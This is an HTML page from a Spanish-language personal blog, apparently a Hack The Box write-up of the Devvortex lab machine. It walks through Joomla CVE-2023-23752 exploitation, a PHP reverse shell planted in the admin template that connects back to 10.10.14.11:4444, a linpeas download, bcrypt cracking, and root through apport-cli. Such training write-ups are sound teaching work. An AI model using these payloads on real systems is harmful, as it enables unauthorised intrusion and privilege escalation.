@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hack The Box — Devvortex Write-up (Español) — Joaquin Silvagni</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <nav>
+        <a class="nav-logo" href="../index.html"><span>~/</span>zsodex</a>
+        <ul class="nav-links">
+            <li><a href="../index.html#ejpt">Cert</a></li>
+            <li><a href="../index.html#blog">Blog</a></li>
+            <li><a href="../index.html#proyectos">Proyectos</a></li>
+            <li><a href="../index.html#skills">Skills</a></li>
+            <li><a href="../index.html#contacto">Contacto</a></li>
+        </ul>
+    </nav>
+    <div class="post-page" style="display:block">
+        <a class="pb" href="../index.html#blog">&larr; Volver al blog</a>
+        <div class="pc2">
+            <div class="ph2">
+                <div class="pm">
+                    <span class="cat-badge" style="background:rgba(163,230,53,.1);color:#a3e635;border:1px solid rgba(163,230,53,.25)">HackTheBox</span>
+                    <span class="pdate">2025-03-27</span>
+                </div>
+                <h1 class="ph1">Hack The Box — Devvortex Write-up (Español)</h1>
+                <p class="psum">Explotación de Joomla vulnerable (CVE-2023-23752) para obtener credenciales, reverse shell via template PHP, crackeo de hashes bcrypt y escalada con CVE-2023-1326.</p>
+                <div class="ptr">
+                    <span class="tag">Joomla</span>
+                    <span class="tag">CVE-2023-23752</span>
+                    <span class="tag">RCE</span>
+                    <span class="tag">PrivEsc</span>
+                </div>
+            </div>
+            <div class="post-content">
+                <p><strong>Autor:</strong> zSodex</p>
+                <p><strong>Dificultad:</strong> Easy</p>
+
+                <p><strong>Técnicas clave:</strong></p>
+                <ul>
+                    <li>Explotación de Joomla</li>
+                    <li>Crackeo de hashes</li>
+                    <li>Apport-cli para escalar privilegios</li>
+                </ul>
+
+                <h2>Reconocimiento inicial</h2>
+
+                <p>Escaneo básico de puertos con nmap:</p>
+
+<pre><code>sudo nmap -sV -sC 10.10.11.242</code></pre>
+
+                <p>Puertos abiertos encontrados:</p>
+                <ul>
+                    <li>22/tcp — SSH (OpenSSH 8.2p1 Ubuntu)</li>
+                    <li>80/tcp — HTTP (nginx 1.18.0 Ubuntu)</li>
+                </ul>
+
+                <p>Configuración inicial:</p>
+
+<pre><code>sudo sh -c 'echo "10.10.11.242 devvortex.htb" &gt;&gt; /etc/hosts'</code></pre>
+
+                <h2>Descubrimiento de subdominios</h2>
+
+<pre><code>gobuster vhost -u devvortex.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</code></pre>
+
+                <p>Encontré el subdominio: <code>dev.devvortex.htb</code></p>
+
+<pre><code># Agregué al archivo hosts:
+10.10.11.242 dev.devvortex.htb devvortex.htb</code></pre>
+
+                <h2>Enumeración de directorios</h2>
+
+<pre><code>dirsearch -u http://dev.devvortex.htb/</code></pre>
+
+                <h2>Explotación de Joomla (CVE-2023-23752)</h2>
+
+                <p>Descubrí que el sitio usaba Joomla. Verifiqué la versión en:</p>
+
+                <p><code>http://dev.devvortex.htb/language/en-GB/langmetadata.xml</code></p>
+
+                <p>Versiones anteriores a 4.2.8 son vulnerables. Usé el exploit CVE-2023-23752:</p>
+
+                <p><a href="https://github.com/Acceis/exploit-CVE-2023-23752" target="_blank">https://github.com/Acceis/exploit-CVE-2023-23752</a></p>
+
+                <p>Credenciales obtenidas:</p>
+                <ul>
+                    <li><strong>Usuario:</strong> lewis</li>
+                    <li><strong>Contraseña:</strong> Panth4r.....</li>
+                </ul>
+
+                <h2>Obtención de reverse shell</h2>
+
+                <p>Accedí al panel de administración: <code>http://dev.devvortex.htb/administrator/</code></p>
+
+                <p>Modifiqué la plantilla Cassiopeia para incluir código PHP malicioso:</p>
+
+                <p>Sistema → Plantillas de Administrador → index.php</p>
+
+                <p>Agregué al final del archivo:</p>
+
+<pre><code>&lt;?php system("bash -c 'sh -i &gt;&amp; /dev/tcp/10.10.14.11/4444 0&gt;&amp;1'"); ?&gt;</code></pre>
+
+                <p>Escuché en mi máquina:</p>
+
+<pre><code>nc -lvnp 4444</code></pre>
+
+                <p>Accedí a la plantilla para ejecutar el código:</p>
+
+                <p><code>http://dev.devvortex.htb/templates/cassiopeia/index.php</code></p>
+
+                <p>Conseguí acceso como <code>www-data</code>.</p>
+
+                <h2>Escalada de privilegios a usuario</h2>
+
+                <p>Subí linpeas.sh para analizar el sistema:</p>
+
+<pre><code># En mi máquina:
+python3 -m http.server 8000
+
+# En la víctima:
+wget http://10.10.14.11:8000/linpeas.sh</code></pre>
+
+                <p>Encontré una base de datos. Me conecté con mysql y las credenciales ya conocidas y dumpé las tablas.</p>
+
+                <p>Extraje hashes y los crackeé con John:</p>
+
+<pre><code>john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</code></pre>
+
+                <p>Accedí por SSH como usuario logan con la contraseña obtenida:</p>
+
+<pre><code>ssh logan@devvortex.htb
+
+cat user.txt</code></pre>
+
+                <h2>Escalada a root (CVE-2023-1326)</h2>
+
+                <p>Verifiqué permisos sudo:</p>
+
+<pre><code>sudo -l</code></pre>
+
+                <p>Encontré que podía ejecutar apport-cli como root, el cual tenía la vulnerabilidad CVE-2023-1326:</p>
+
+<pre><code>sudo apport-cli</code></pre>
+
+                <p>Dentro de apport-cli usé:</p>
+
+<pre><code>v          # Para abrir el editor
+!/bin/bash # Para obtener shell como root</code></pre>
+
+                <p>Conseguí acceso como root:</p>
+
+<pre><code>cat /root/root.txt</code></pre>
+
+                <h2>Resumen de comandos útiles</h2>
+
+<pre><code>sudo nmap -sV -sC 10.10.11.242
+gobuster vhost -u devvortex.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+dirsearch -u http://dev.devvortex.htb/
+nc -lvnp 4444
+python3 -m http.server 8000
+john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+sudo apport-cli → v → !/bin/bash</code></pre>
+            </div>
+        </div>
+    </div>
+    <footer><span>&copy; 2025 <span class="fa">Joaquin Silvagni</span> &middot; zSodex</span><span>Built with &#x1F5A4; &middot; GitHub Pages</span></footer>
+</body>
+</html>
